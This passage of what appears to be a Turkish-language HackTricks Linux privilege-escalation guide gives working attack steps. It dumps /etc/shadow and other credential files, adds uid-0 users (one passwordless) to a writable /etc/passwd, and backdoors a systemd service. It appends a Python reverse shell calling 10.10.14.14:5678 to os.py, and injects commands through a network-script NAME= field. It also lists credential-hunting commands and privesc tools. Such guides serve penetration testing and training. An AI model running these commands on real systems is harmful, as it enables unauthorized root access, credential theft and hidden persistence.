cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer bir dosya) içinde **password hashes** bulunabilir.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Sonra `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makine bir **tomcat** sunucusu çalıştırıyorsa ve **Tomcat servis yapılandırma dosyasını /etc/systemd/ içinde değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### Klasörleri Kontrol Edin

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakika içinde değiştirilmiş dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parolalar içerebilen bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parolalar içerebilecek birkaç olası dosyayı** arar.\
**Kullanabileceğiniz başka ilginç bir araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bilgisayarda depolanan birçok parolayı geri almakta kullanılan açık kaynaklı bir uygulama.

### Günlükler

Eğer günlükleri okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar garipse, muhtemelen o kadar ilginç olur.\
Ayrıca, bazı **"bad"** yapılandırılmış (backdoored?) **audit logs** size, bu yazıda açıklandığı gibi, **audit logs** içine **parolaları kaydetme** imkanı verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Günlükleri okumak için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosyanın **adında** veya **içeriğinde** "**password**" kelimesini içeren dosyaları kontrol etmelisiniz, ve loglar içindeki IPs ve emails ile hashes regexps'leri de kontrol edin.\
Bunların nasıl yapılacağını burada listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Writable files

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabilirsiniz** ya da **python kütüphanelerini değiştirebilirsiniz**, OS library'yi değiştirip backdoor itebilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'teki bir zafiyet, bir log dosyası veya üst dizinlerinde **yazma izni** (write permissions) olan kullanıcıların ayrıcalık yükseltmesi elde etmesine olanak tanır. Çünkü `logrotate`, genellikle **root** olarak çalışan, keyfi dosyaları çalıştıracak şekilde manipüle edilebilir; özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde. İzinleri sadece _/var/log_ içinde değil, log rotasyonunun uygulandığı herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürümü `3.18.0` ve daha eski sürümleri etkiler

Zafiyetle ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzerdir; bu yüzden logları değiştirebildiğinizi her gördüğünüzde, bu logları kimin yönettiğini kontrol edin ve logları symlink ile değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Her ne sebeple olursa olsun, bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scripti **yazabiliyor** veya mevcut bir scripti **ayarlayabiliyorsa**, sisteminiz **system is pwned**.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyalarına benzerler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumda, bu network scriptlerindeki `NAME=` ataması doğru şekilde işlenmiyor. Eğer isimde **boşluk** (white/blank space) varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor. Bu da demektir ki, **ilk boşluktan sonraki her şey root olarak çalıştırılıyor**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Not: Network ile /bin/id arasındaki boşluğu unutmayın_)

### **init, init.d, systemd ve rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **script'lerin** bulunduğu yerdir; **klasik Linux servis yönetim sistemi** olarak hizmet eder. Servisleri `start`, `stop`, `restart` ve bazen `reload` için scriptler içerir. Bu scriptler doğrudan veya `/etc/rc?.d/` içindeki sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Diğer taraftan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından tanıtılan daha yeni bir servis yönetimidir ve servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit script'leri hâlâ Upstart konfigürasyonlarıyla birlikte kullanılır.

**systemd**, talep üzerine daemon başlatma, automount yönetimi ve sistem durumunun anlık görüntülerini alma gibi gelişmiş özellikler sunan modern bir init ve servis yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenler, böylece sistem yönetimini kolaylaştırır.

## Diğer İpuçları

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden Kaçış


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle ayrıcalıklı kernel fonksiyonelliğini userspace manager'a açmak için bir syscall'e hook atar. Zayıf manager doğrulaması (ör. FD-order'a dayalı imza kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten root edilmiş cihazlarda root'a escalate etmesine izin verebilir. Daha fazla bilgi ve exploitation detayları için buraya bakın:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-tabanlı service discovery, VMware Tools/Aria Operations içinde process komut satırlarından bir binary yolunu çıkarıp ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin veren desenler (ör. \S kullanımı) writable lokasyonlarda (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş listener'larla eşleşebilir ve root olarak çalıştırılmaya yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer discovery/monitoring yığınlarına uygulanabilir genelleştirilmiş desen için buraya bakın:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Kaynaklar

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
